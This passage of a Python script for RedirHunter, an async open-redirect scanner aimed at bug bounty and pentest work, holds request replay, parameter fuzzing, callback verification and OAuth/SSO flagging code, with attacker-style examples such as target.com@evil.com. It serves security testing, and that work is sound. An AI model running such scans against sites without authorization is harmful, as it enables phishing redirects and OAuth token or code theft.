                        callback_verified, callback_status = await self._verify_callback(
                            session, location, base_url)
                    res = TestResult(
                        stage=stage, technique="raw_request",
                        original_input=f"{raw_request['method']} {raw_request['path']}",
                        tested_param="(raw request marker)",
                        payload=rendered_payload, test_url=full_url,
                        status=resp.status, response_size=size,
                        location_header=location, verdict=verdict, confidence=confidence,
                        elapsed_ms=elapsed,
                        callback_verified=callback_verified, callback_status=callback_status,
                    )
            except Exception as e:
                res = TestResult(
                    stage=stage, technique="raw_request",
                    original_input=f"{raw_request['method']} {raw_request['path']}",
                    tested_param="(raw request marker)",
                    payload=rendered_payload, test_url=full_url,
                    verdict="ERROR", error=str(e),
                    elapsed_ms=int((time.monotonic() - t0) * 1000),
                )
        self.results.append(res)
        self.print_result(res)

    async def run_fuzz_job(self, session, line: str, param_name: str, target_domain: str) -> FuzzResult:
        """One candidate param name, one request: does setting it to an
        off-site URL actually cause a redirect at all? This is a cheap
        discovery pass, not a bypass test - one plain 'https://{HOST}'
        value per candidate name, not the full payload list."""
        value = f"https://{target_domain}"
        test_url = render_fuzz_url(line, param_name, value)
        t0 = time.monotonic()
        async with self.sem:
            await self.rate_limiter.wait()
            if self.args.delay:
                await asyncio.sleep(self.args.delay)
            try:
                kwargs = dict(allow_redirects=False, timeout=self.args.timeout, ssl=self.ssl)
                if self.args.proxy:
                    kwargs["proxy"] = self.args.proxy
                async with session.get(test_url, **kwargs) as resp:
                    body = b""
                    if self.args.read_body:
                        body = await resp.read()
                    size = int(resp.headers.get("Content-Length", len(body)))
                    location = resp.headers.get("Location", "")
                    elapsed = int((time.monotonic() - t0) * 1000)
                    base_url = str(resp.url)

                    is_hit = False
                    if 300 <= resp.status < 400 and location:
                        is_hit = host_matches(location, target_domain, base_url)
                    elif body:
                        text = body.decode(errors="ignore")
                        m = META_REFRESH_RE.search(text)
                        if m and host_matches(m.group(1), target_domain, base_url):
                            is_hit = True
                        else:
                            m2 = JS_REDIRECT_RE.search(text)
                            if m2:
                                cand = m2.group(1) or m2.group(2)
                                if cand and host_matches(cand, target_domain, base_url):
                                    is_hit = True

                    res = FuzzResult(
                        param_name=param_name, test_url=test_url,
                        status=resp.status, response_size=size,
                        location_header=location,
                        verdict="REDIRECT_PARAM" if is_hit else "NOT_REDIRECT_PARAM",
                        elapsed_ms=elapsed, source_line=line,
                    )
                    if is_hit and not self.args.no_verify_callback:
                        fetched, cb_status, cb_size = await self._fetch_after_redirect(
                            session, location, base_url)
                        res.callback_fetched = fetched
                        res.callback_status = cb_status
                        res.callback_size = cb_size
            except Exception as e:
                res = FuzzResult(param_name=param_name, test_url=test_url, verdict="ERROR",
                                  error=str(e), elapsed_ms=int((time.monotonic() - t0) * 1000),
                                  source_line=line)
        self.fuzz_results.append(res)
        self.print_fuzz_result(res)
        return res

    def print_fuzz_result(self, res: FuzzResult):
        if self.args.only_vuln and res.verdict != "REDIRECT_PARAM":
            return
        if res.verdict == "REDIRECT_PARAM":
            color, label = Fore.BLUE + Style.BRIGHT, "REDIRECT PARAM FOUND"
        elif res.verdict == "ERROR":
            color, label = Fore.YELLOW, "ERROR"
        else:
            color, label = Fore.RED, "not a redirect param"
        outcome = f"{res.test_url} --> {res.status} ({res.response_size} bytes) [{label}]"
        if res.verdict == "REDIRECT_PARAM":
            if res.callback_fetched:
                outcome += f" | after-redirect fetch: {res.callback_status} ({res.callback_size} bytes)"
            elif not self.args.no_verify_callback:
                outcome += " | after-redirect fetch: unreachable"
        param_part = f"param: {res.param_name}"
        if COLOR:
            line = f"{color}{outcome}{Style.RESET_ALL} | {Fore.GREEN}{param_part}{Style.RESET_ALL}"
        else:
            line = f"{outcome} | {param_part}"
        print(line)

    async def run_fuzz(self, fuzz_lines: list[str], param_names: list[str], target_domain: str):
        connector = aiohttp.TCPConnector(limit=self.args.concurrency, ssl=self.ssl)
        async with aiohttp.ClientSession(headers=self.headers, cookies=self.cookies,
                                          connector=connector, trust_env=True) as session:
            tasks = [self.run_fuzz_job(session, line, name, target_domain)
                     for line in fuzz_lines for name in param_names]
            await asyncio.gather(*tasks)

    def print_result(self, res: TestResult):
        if self.args.only_vuln and res.verdict != "VULNERABLE":
            return
        if res.verdict == "VULNERABLE":
            color = Fore.BLUE + Style.BRIGHT
        elif res.verdict == "ERROR":
            color = Fore.YELLOW
        else:
            color = Fore.RED
        tag = f"[STAGE {res.stage}][{res.technique}] {res.verdict}{(' - ' + res.confidence) if res.confidence else ''}"
        if res.oauth_flag and res.verdict == "VULNERABLE":
            tag += " -- SSO/OAuth param: review for token/code leakage and potential account-takeover impact"
        if res.verdict == "VULNERABLE" and res.confidence.startswith("confirmed"):
            if res.callback_verified:
                tag += f" -- callback verified: your server responded ({res.callback_status})"
            elif not self.args.no_verify_callback:
                tag += " -- callback NOT verified: your server/Collaborator did not respond"
        size_part = f"({res.response_size} bytes"
        if self.args.baseline and res.baseline_size:
            diff = res.response_size - res.baseline_size
            size_part += f", baseline {res.baseline_size}, diff {'+' if diff >= 0 else ''}{diff}"
        size_part += ")"
        outcome_part = (f"{res.original_input} --> {res.test_url} --> {res.status} {size_part} "
                        f"[{tag}]")
        payload_part = f"test payload: {safe_display(res.payload)}"
        if COLOR:
            line = (f"{color}{outcome_part}{Style.RESET_ALL} | "
                    f"{Fore.GREEN}{payload_part}{Style.RESET_ALL}")
        else:
            line = f"{outcome_part} | {payload_part}"
        print(line)

    async def run(self, jobs: list[Job], path_lines: list[str], target_domain: str,
                  raw_request: dict = None, scheme: str = "https", raw_host: str = "",
                  target_site: str = ""):
        connector = aiohttp.TCPConnector(limit=self.args.concurrency, ssl=self.ssl)
        async with aiohttp.ClientSession(headers=self.headers, cookies=self.cookies,
                                          connector=connector, trust_env=True) as session:
            stage1, stage2 = [], []

            if raw_request is not None:
                for tmpl in self.query_payloads:
                    stage = is_stage2(tmpl)
                    if self.args.stage != "both" and str(stage) != self.args.stage:
                        continue
                    coro = self.run_raw_request_job(session, raw_request, tmpl, target_domain,
                                                     scheme, raw_host, target_site)
                    (stage1 if stage == 1 else stage2).append(coro)
                if stage1:
                    print(f"\n{'=' * 80}\n=== STAGE 1: host-only payloads ({len(stage1)} requests) ===\n{'=' * 80}")
                    await asyncio.gather(*stage1)
                if stage2:
                    print(f"\n{'=' * 80}\n=== STAGE 2: target-based payloads ({len(stage2)} requests) ===\n{'=' * 80}")
                    await asyncio.gather(*stage2)
                return

            for job in jobs:
                for tmpl in self.query_payloads:
                    stage = is_stage2(tmpl)
                    if self.args.stage != "both" and str(stage) != self.args.stage:
                        continue
                    coro = self.run_query_job(session, job, tmpl, target_domain)
                    (stage1 if stage == 1 else stage2).append(coro)
                if job.allow_pollution and not self.args.skip_param_pollution:
                    if self.args.stage in ("both", "1"):
                        for hp in ("https://{HOST}", "//{HOST}", "{HOST}"):
                            stage1.append(self.run_pollution_job(session, job, hp, target_domain))

            if not self.args.skip_path_injection:
                for line in path_lines:
                    for prefix, suffix in path_injection_variants(line):
                        for tmpl in self.path_payloads:
                            stage = is_stage2(tmpl)
                            if self.args.stage != "both" and str(stage) != self.args.stage:
                                continue
                            coro = self.run_path_job(session, line, tmpl, target_domain, prefix, suffix)
                            (stage1 if stage == 1 else stage2).append(coro)

            if stage1:
                print(f"\n{'=' * 80}\n=== STAGE 1: host-only payloads ({len(stage1)} requests) ===\n{'=' * 80}")
                await asyncio.gather(*stage1)
            if stage2:
                print(f"\n{'=' * 80}\n=== STAGE 2: target-based payloads ({len(stage2)} requests) ===\n{'=' * 80}")
                await asyncio.gather(*stage2)


# --------------------------------------------------------------------------- #
# Output writers
# --------------------------------------------------------------------------- #

def write_csv(results: list[TestResult], path: str):
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=list(asdict(results[0]).keys()) if results else [])
        writer.writeheader()
        for r in results:
            writer.writerow(asdict(r))


def write_fuzz_output(results: list[FuzzResult], path: str):
    """Only positive findings get saved - fuzz mode is a discovery pass,
    and a file full of hundreds of 'not a redirect param' lines isn't
    useful to anyone. .txt (default) is a plain human-readable report;
    .json gives the same positives as structured records."""
    positives = [r for r in results if r.verdict == "REDIRECT_PARAM"]
    if path.endswith(".json"):
        with open(path, "w", encoding="utf-8") as f:
            json.dump([asdict(r) for r in positives], f, indent=2)
        return
    with open(path, "w", encoding="utf-8") as f:
        if not positives:
            f.write("No redirect params found.\n")
        for r in positives:
            f.write(f"{r.test_url}\n")
            f.write(f"  param: {r.param_name}\n")
            f.write(f"  status: {r.status}  size: {r.response_size} bytes\n")
            f.write(f"  location: {r.location_header}\n")
            if r.callback_fetched:
                f.write(f"  after-redirect fetch: {r.callback_status} ({r.callback_size} bytes)\n")
            else:
                f.write("  after-redirect fetch: unreachable\n")
            f.write("\n")


def print_error_summary(results: list) -> None:
    """A batch of connection/SSL/timeout errors looks IDENTICAL to '0
    findings' in the vulnerability counts alone - that's a real way to
    silently miss that the scan never actually reached the target at all
    (wrong --scheme, dead proxy, unreachable host, TLS mismatch). Always
    surface the error count, and loudly flag it with a sample error when
    it's a large fraction of the run, so a total connectivity failure is
    never mistaken for "not vulnerable"."""
    total = len(results)
    if total == 0:
        return
    errors = [r for r in results if r.verdict == "ERROR"]
    print(f"[*] Errors: {len(errors)}/{total}")
    if errors and len(errors) / total > 0.3:
        print(f"\n{'!' * 80}")
        print(f"[!] WARNING: {len(errors)}/{total} requests ({len(errors)/total:.0%}) errored out "
              f"instead of completing. This usually means the scan never actually reached the "
              f"target - NOT that nothing is vulnerable. Common causes: wrong --scheme "
              f"(http vs https), a dead/misconfigured --proxy, an unreachable host, or a "
              f"firewall/TLS mismatch.")
        print(f"[!] Sample error: {errors[0].error}")
        print(f"{'!' * 80}\n")


def write_json(results: list[TestResult], path: str):
    grouped = {"stage_1_host_only": [], "stage_2_target_based": []}
    for r in results:
        key = "stage_1_host_only" if r.stage == 1 else "stage_2_target_based"
        grouped[key].append(asdict(r))

    def vuln_count(items):
        return sum(1 for i in items if i["verdict"] == "VULNERABLE")

    summary = {
        "total_requests": len(results),
        "stage_1_requests": len(grouped["stage_1_host_only"]),
        "stage_2_requests": len(grouped["stage_2_target_based"]),
        "stage_1_vulnerable": vuln_count(grouped["stage_1_host_only"]),
        "stage_2_vulnerable": vuln_count(grouped["stage_2_target_based"]),
        "oauth_flagged_vulnerable": sum(
            1 for r in results if r.oauth_flag and r.verdict == "VULNERABLE"
        ),
    }
    with open(path, "w", encoding="utf-8") as f:
        json.dump({"summary": summary, **grouped}, f, indent=2)


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #

def main():
    parser = argparse.ArgumentParser(
        description="RedirHunter - two-stage async open-redirect scanner for bug bounty / pentest recon lists.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("-i", "--input", default=None,
                         help="Single URL, or path to a file with one URL per line. "
                              "Mutually exclusive with --request-file.")
    parser.add_argument("--request-file", default=None,
                         help="Path to a raw HTTP request (Burp 'Copy to file'/'Save item' "
                              "format) with a literal {} marking the injection point in the "
                              "path/query and/or body. Use this for flows that only become "
                              "vulnerable after a prior action (login, a completed step) - "
                              "capture the authenticated request once in Burp, mark the "
                              "redirect param, and every payload gets replayed through that "
                              "exact request. Mutually exclusive with -i.")
    parser.add_argument("--scheme", choices=["http", "https"], default="https",
                         help="Scheme to use when reconstructing the URL from --request-file "
                              "(raw HTTP requests don't carry a scheme). Default https.")
    parser.add_argument("--default-scheme", choices=["http", "https"], default="https",
                         help="Scheme automatically added to any -i URL (single URL or a line in "
                              "a file) that's missing http:// or https:// - rather than letting "
                              "every request on that line fail silently. Default https.")
    parser.add_argument("-t", "--target-domain", required=True,
                         help="Your test/collaborator domain, e.g. yourid.oastify.com or evil.com.")
    parser.add_argument("-T", "--target-site",
                         help="The site's own trusted domain, used for Stage 2 confusion payloads "
                              "(e.g. target.com@evil.com). If omitted, auto-extracted per URL from "
                              "its own hostname. Set this explicitly for OAuth/SSO flows where the "
                              "trusted domain differs from the URL you're actually hitting.")
    parser.add_argument("-p", "--payloads", default=str(Path(__file__).parent / "payloads.txt"),
                         help="Path to query-value payload wordlist (default: bundled payloads.txt).")
    parser.add_argument("--path-payloads", default=str(Path(__file__).parent / "path_payloads.txt"),
                         help="Path to path-prefix-injection payload wordlist.")
    parser.add_argument("--params", default=str(Path(__file__).parent / "params.txt"),
                         help="Path to redirect param wordlist for auto-detect mode.")
    parser.add_argument("-o", "--output", help="Output file path (.csv or .json).")
    parser.add_argument("--format", choices=["csv", "json"], help="Force output format.")
    parser.add_argument("-c", "--concurrency", type=int, default=20,
                         help="Max concurrent in-flight requests (default 20). The --rate limit "
                              "below is what actually paces dispatch; this just caps how many "
                              "requests can be queued/open at once.")
    parser.add_argument("--rate", type=float, default=5.0,
                         help="Requests per second, enforced globally across all concurrent "
                              "workers (default 5/sec). Sending everything at once is the "
                              "fastest way to trip a WAF or get rate-limited/blocked mid-scan. "
                              "Set higher if you know the target can take it, or 0 to disable "
                              "rate limiting entirely (not recommended).")
    parser.add_argument("--timeout", type=int, default=10, help="Per-request timeout in seconds (default 10).")
    parser.add_argument("--delay", type=float, default=0.0,
                         help="Extra fixed delay in seconds before each request, on top of --rate.")
    parser.add_argument("--only-vuln", action="store_true", help="Only print/save confirmed or possible findings.")
    parser.add_argument("--proxy", help="Route requests through an HTTP proxy, e.g. http://127.0.0.1:8080.")
    parser.add_argument("--header", action="append", help="Extra header, repeatable.")
    parser.add_argument("--cookie", help="Cookie header string.")
    parser.add_argument("--scope", help="File with allowed root domains, one per line.")
    parser.add_argument("--insecure", action="store_true",
                         help="Skip TLS certificate verification. Off by default (certs ARE "
                              "verified) - only needed for self-signed certs or internal targets "
                              "with broken chains. Applies to every request the tool makes.")
    parser.add_argument("--read-body", action="store_true",
                         help="Also download response body to catch meta-refresh/JS-based redirects.")
    parser.add_argument("--baseline", action="store_true",
                         help="Fetch each base URL once first and record its size for diffing.")
    parser.add_argument("--no-verify-callback", action="store_true",
                         help="Disable the follow-up fetch to the redirect target for confirmed "
                              "findings. By default, on any confirmed finding the tool actually "
                              "requests the resolved redirect URL to prove your server/Collaborator "
                              "was genuinely reachable, not just that the Location header matched.")
    parser.add_argument("--callback-timeout", type=int, default=5,
                         help="Timeout in seconds for the callback-verification fetch (default 5).")
    parser.add_argument("--encode-payload", action="store_true",
                         help="URL-encode the payload before injection.")
    parser.add_argument("--skip-path-injection", action="store_true",
                         help="Disable path-prefix injection testing (enabled by default).")
    parser.add_argument("--skip-param-pollution", action="store_true",
                         help="Disable duplicate-parameter pollution testing (enabled by default).")
    parser.add_argument("--stage", choices=["1", "2", "both"], default="both",
                         help="Run only Stage 1 (host-only), only Stage 2 (target-based), or both (default).")
    parser.add_argument("--method", choices=["GET", "POST", "PUT", "PATCH"], default="GET",
                         help="HTTP method. Use POST/PUT/PATCH with --body for a redirect param "
                              "carried in a request body (JSON, form-urlencoded, XML, etc. - see "
                              "--content-type) rather than a URL query string.")
    parser.add_argument("--body", help="Path to a request body template containing a literal {} "
                                        "placeholder for the payload (JSON string-escaped automatically). "
                                        "Requires --method POST.")
    parser.add_argument("--content-type", default="application/json",
                         help="Content-Type header when --body is used (default application/json).")
    args = parser.parse_args()

    if not args.input and not args.request_file:
        print("[!] Provide either -i/--input or --request-file.")
        sys.exit(1)
    if args.input and args.request_file:
        print("[!] -i/--input and --request-file are mutually exclusive - use one.")
        sys.exit(1)
    if args.body and args.method not in ("POST", "PUT", "PATCH"):
        print("[!] --body requires --method POST, PUT, or PATCH.")
        sys.exit(1)

    query_payload_templates = load_wordlist(args.payloads)
    path_payload_templates = load_wordlist(args.path_payloads)
    scope_domains = load_wordlist(args.scope) if args.scope else None

    extra_query, extra_path = generate_dynamic_payloads(args.target_domain)
    query_payload_templates += extra_query
    path_payload_templates += extra_path

    # -------------------------------------------------------------------- #
    # Raw request mode - replay a captured (e.g. authenticated) request
    # -------------------------------------------------------------------- #
    if args.request_file:
        with open(args.request_file, "r", encoding="utf-8") as f:
            raw_text = f.read()
        try:
            raw_request = parse_raw_request(raw_text)
        except ValueError as e:
            print(f"[!] {e}")
            sys.exit(1)

        host = raw_request["headers"].get("Host") or raw_request["headers"].get("host")
        if not host:
            print("[!] Request file has no Host header - can't build a target URL.")
            sys.exit(1)

        n_query = len(query_payload_templates)
        if args.stage != "both":
            n_query = sum(1 for t in query_payload_templates if str(is_stage2(t)) == args.stage)
        print(f"[*] Raw request mode: {raw_request['method']} {raw_request['path']}")
        print(f"[*] Host: {host} (scheme: {args.scheme})")
        print(f"[*] Estimated total requests: ~{n_query}")
        if args.rate and args.rate > 0:
            eta = n_query / args.rate
            print(f"[*] Rate limit: {args.rate}/sec -> estimated time: ~{eta:.0f}s ({eta/60:.1f} min)")
        print(f"[*] Test domain (HOST): {args.target_domain}")
        print(f"[*] Trusted site domain (TARGET): {args.target_site if args.target_site else '(= Host header)'}")
        if args.proxy:
            print(f"[*] Routing through proxy: {args.proxy}")

        scanner = Scanner(args, query_payload_templates, path_payload_templates)
        try:
            asyncio.run(scanner.run([], [], args.target_domain, raw_request=raw_request,
                                     scheme=args.scheme, raw_host=host, target_site=args.target_site or host))
        except KeyboardInterrupt:
            print("\n[!] Interrupted, writing partial results...")

        stage1_vuln = sum(1 for r in scanner.results if r.verdict == "VULNERABLE" and r.stage == 1)
        stage2_vuln = sum(1 for r in scanner.results if r.verdict == "VULNERABLE" and r.stage == 2)
        print(f"\n{'-' * 80}")
        print(f"[*] Done. {len(scanner.results)} requests sent.")
        print(f"[*] Stage 1 (host-only) findings: {stage1_vuln}")
        print(f"[*] Stage 2 (target-based) findings: {stage2_vuln}")
        print_error_summary(scanner.results)
        if args.output:
            fmt = args.format or ("json" if args.output.endswith(".json") else "csv")
            (write_json if fmt == "json" else write_csv)(scanner.results, args.output)
            print(f"[*] Results written to {args.output}")
        return

    # -------------------------------------------------------------------- #
    # Normal URL-list mode
    # -------------------------------------------------------------------- #
    known_params = set(p.lower() for p in load_wordlist(args.params))

    raw_lines = load_lines(args.input)
    lines = []
    for ln in raw_lines:
        fixed = ensure_scheme(ln, args.default_scheme)
        if fixed != ln:
            print(f"[*] No scheme given, assuming {args.default_scheme}:// -> {fixed}")
        lines.append(fixed)

    # -------------------------------------------------------------------- #
    # Fuzz mode - a line containing the literal {{}} marker triggers a
    # param-name discovery pass instead of bypass testing. This is its own
    # exclusive run: any non-fuzz lines in the same input are skipped with a
    # warning, matching the intended two-step workflow (fuzz first, then
    # re-run normally against whatever param name it finds).
    # -------------------------------------------------------------------- #
    fuzz_lines = [ln for ln in lines if FUZZ_TOKEN in ln]
    if fuzz_lines:
        non_fuzz = [ln for ln in lines if FUZZ_TOKEN not in ln]
        if non_fuzz:
            print(f"[*] Fuzz mode: {len(non_fuzz)} non-fuzz line(s) in the input will be skipped - "
                  f"fuzz mode ({FUZZ_TOKEN}) runs on its own; re-run separately for normal bypass testing.")

        param_names = load_wordlist(args.params)
        total_fuzz = len(fuzz_lines) * len(param_names)
        print(f"[*] Fuzz mode: {len(fuzz_lines)} URL(s) x {len(param_names)} candidate param name(s) "
              f"= ~{total_fuzz} requests")
        if args.rate and args.rate > 0:
            eta = total_fuzz / args.rate
            print(f"[*] Rate limit: {args.rate}/sec -> estimated time: ~{eta:.0f}s ({eta/60:.1f} min)")
        print(f"[*] Test value: https://{args.target_domain}")

        scanner = Scanner(args, [], [])
        try:
            asyncio.run(scanner.run_fuzz(fuzz_lines, param_names, args.target_domain))
        except KeyboardInterrupt:
            print("\n[!] Interrupted, writing partial results...")

        hits = [r for r in scanner.fuzz_results if r.verdict == "REDIRECT_PARAM"]
        print(f"\n{'-' * 80}")
        print(f"[*] Done. {len(scanner.fuzz_results)} requests sent.")
        print(f"[*] Redirect params found: {len(hits)}")
        print_error_summary(scanner.fuzz_results)

        if args.output:
            write_fuzz_output(scanner.fuzz_results, args.output)
            print(f"[*] Positive findings written to {args.output}")

        if hits:
            print(f"\n[!] Found {len(hits)} live redirect param(s). Re-run in normal mode to test "
                  f"full bypasses, e.g.:")
            seen = set()
            for r in hits:
                if r.param_name in seen:
                    continue
                seen.add(r.param_name)
                suggested = build_bypass_url_from_fuzz(r.source_line, r.param_name)
                print(f'    python3 redirhunter.py -i "{suggested}" -t {args.target_domain} --only-vuln')
        return

    jobs: list[Job] = []
    skipped = 0
    body_mode = bool(args.method in ("POST", "PUT", "PATCH") and args.body)
    for line in lines:
        if not in_scope(line, scope_domains):
            skipped += 1
            continue
        jobs.extend(parse_input_line(line, known_params, body_mode=body_mode))

    path_lines = [] if args.skip_path_injection else collect_path_injection_lines(
        [ln for ln in lines if in_scope(ln, scope_domains)]
    )

    if not jobs and not path_lines:
        print("[!] No testable URLs found (no query params matched, no {} markers, "
              "path injection disabled, or all out of scope).")
        sys.exit(1)

    n_query = sum(1 for j in jobs for _ in query_payload_templates)
    n_pollution = sum(3 for j in jobs if j.allow_pollution and not args.skip_param_pollution)
    n_path_variants = sum(len(path_injection_variants(ln)) for ln in path_lines)
    n_path = n_path_variants * len(path_payload_templates)
    total = n_query + n_pollution + n_path

    print(f"[*] {len(lines)} input line(s) -> {len(jobs)} query-param job(s), "
          f"{len(path_lines)} path-injection target(s)")
    print(f"[*] {len(query_payload_templates)} query payload(s), {len(path_payload_templates)} path payload(s)")
    print(f"[*] Estimated total requests: ~{total} (query: {n_query}, pollution: {n_pollution}, path: {n_path})")
    if args.rate and args.rate > 0:
        eta = total / args.rate
        print(f"[*] Rate limit: {args.rate}/sec -> estimated time: ~{eta:.0f}s ({eta/60:.1f} min)")
    else:
        print("[!] Rate limiting disabled (--rate 0) - all requests fire as fast as concurrency allows.")
    if skipped:
        print(f"[*] Skipped {skipped} line(s) outside --scope.")
    print(f"[*] Test domain (HOST): {args.target_domain}")
    print(f"[*] Trusted site domain (TARGET): "
          f"{args.target_site if args.target_site else '(auto per URL)'}")
    if args.proxy:
        print(f"[*] Routing through proxy: {args.proxy}")
    if args.method in ("POST", "PUT", "PATCH"):
        print(f"[*] Method: {args.method}, body template: {args.body}")

    scanner = Scanner(args, query_payload_templates, path_payload_templates)
    try:
        asyncio.run(scanner.run(jobs, path_lines, args.target_domain))
    except KeyboardInterrupt:
        print("\n[!] Interrupted, writing partial results...")

    stage1_vuln = sum(1 for r in scanner.results if r.verdict == "VULNERABLE" and r.stage == 1)
    stage2_vuln = sum(1 for r in scanner.results if r.verdict == "VULNERABLE" and r.stage == 2)
    oauth_vuln = sum(1 for r in scanner.results if r.verdict == "VULNERABLE" and r.oauth_flag)
    print(f"\n{'-' * 80}")
    print(f"[*] Done. {len(scanner.results)} requests sent.")
    print(f"[*] Stage 1 (host-only) findings: {stage1_vuln}")
    print(f"[*] Stage 2 (target-based) findings: {stage2_vuln}")
    if oauth_vuln:
        print(f"[!] {oauth_vuln} finding(s) on SSO/OAuth-related params -- review for "
              f"token/code leakage and potential account-takeover impact.")
    print_error_summary(scanner.results)

    if args.output:
        fmt = args.format or ("json" if args.output.endswith(".json") else "csv")
        if fmt == "json":
            write_json(scanner.results, args.output)
        else:
            write_csv(scanner.results, args.output)
        print(f"[*] Results written to {args.output}")


if __name__ == "__main__":
    main()
